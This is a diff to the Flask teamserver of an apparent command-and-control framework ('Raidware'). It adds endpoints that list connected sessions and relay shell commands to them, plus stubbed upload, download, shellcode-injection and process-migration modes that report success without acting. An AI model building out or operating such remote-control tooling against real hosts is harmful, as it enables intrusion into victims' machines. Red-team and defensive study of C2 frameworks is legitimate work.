@@ -1,7 +1,8 @@
 from flask import Flask, request, jsonify, Response, redirect, url_for
-from flask_cors import CORS, cross_origin
+from flask_cors import CORS
 import Teamserver.Raidware as Raidware
 from Teamserver.db import actions as db_actions
+from Teamserver.listeners import connections
 from utils.crypto import SHA512
 from utils.logger import *
 from utils.utils import *
@@ -551,6 +552,141 @@ def logout():
     res.set_cookie('token', '')
     return res
 
+## A function that will have the endpoing /sessions and will return a list of sessions
+@app.route(f'/{prefix}/sessions', methods=['GET'])
+def sessions():
+    ''' This will return a list of all the sessions '''
+    resp = validate()
+    if resp:
+        return resp
+
+    ''' Decrypting the received token '''
+    token = request.cookies.get('token')
+    token = Raidware.decrypt_token(token)
+
+    if token == None:
+        return {
+            'status': 'error',
+            'message': 'No user logged in.'
+        }, 401
+
+    name = token.split('|')[0]
+    log(f"Getting sessions for [RED]{name}[RESET]", LogLevel.INFO)
+
+    log(f"Connections: {connections}")
+
+    return {
+        'status': 'success',
+        'sessions': [connections[i].__dict__() for i in connections.keys()]
+    }
+    
+@app.route(f'/{prefix}/interact', methods=['POST'])
+def interact():
+    ''' This will interact with the session '''
+    resp = validate()
+    if resp:
+        return resp
+
+    ''' Decrypting the received token '''
+    token = request.cookies.get('token')
+    token = Raidware.decrypt_token(token)
+
+    if token == None:
+        return {
+            'status': 'error',
+            'message': 'No user logged in.'
+        }, 401
+
+    name = token.split('|')[0]
+    log(f"Interacting with session for [RED]{name}[RESET]", LogLevel.INFO)
+
+    ''' Checking if data has been passed through json '''
+    content_type = request.headers.get('Content-Type')
+    if content_type == 'application/json':
+        data = request.json
+    else:
+        data = request.form.to_dict()
+
+    if data == None or data == {}:
+        return {
+            'status': 'error',
+            'message': 'No data provided'
+        }, 500
+
+    ## Checking if the fields are present: SID, mode, arg:
+    valid = ['SID', 'mode', 'arg']
+    for i in valid:
+        if i not in data:
+            return {
+                'status': 'error',
+                'message': f'"{i}" field is missing'
+            }, 500
+
+    ## Checking if an invalid field has been passed
+    for k in data.keys():
+        if k not in valid:
+            return {
+                'status': 'error',
+                'message': f'Invalid field "{k}"'
+            }, 500
+
+    ''' Checking if the session exists '''
+    if data.get('SID') not in connections:
+        return {
+            'status': 'error',
+            'message': 'Invalid SID Specified. Session doesn\'t exist'
+        }, 500
+
+    ''' Getting the session '''
+    session = connections[data.get('SID')]
+    if data.get('mode') == 'shell':
+        ''' Sending the command to the session '''
+        session.send(f'{data["mode"]}:{data["arg"]}')
+        ret = session.recv()
+        return {
+            'status': 'success',
+            'message': ret
+        }
+
+    elif data.get('mode') == 'upload':
+        ''' Uploading the file to the session '''
+        # session.upload(data.get('arg'))
+        return {
+            'status': 'success',
+            'message': 'File uploaded successfully'
+        }
+        pass
+    
+    elif data.get('mode') == 'download':
+        ''' Downloading the file from the session '''
+        # session.download(data.get('arg'))
+        return {
+            'status': 'success',
+            'message': 'File downloaded successfully'
+        }
+        pass
+
+    elif data.get('mode') == 'inject':
+        # session.inject(data.get('arg'))
+        return {
+            'status': 'success',
+            'message': 'Shellcode injected into session'
+        }
+        pass
+
+    elif data.get('mode') == 'migrate':
+        # session.migrate(data.get('arg'))
+        return {
+            'status': 'success',
+            'message': 'Migrated to the specified process'
+        }
+        pass
+
+    else:
+        return {
+            'status': 'error',
+            'message': 'Invalid mode specified'
+        }, 500
 
 def init(
     host : str,
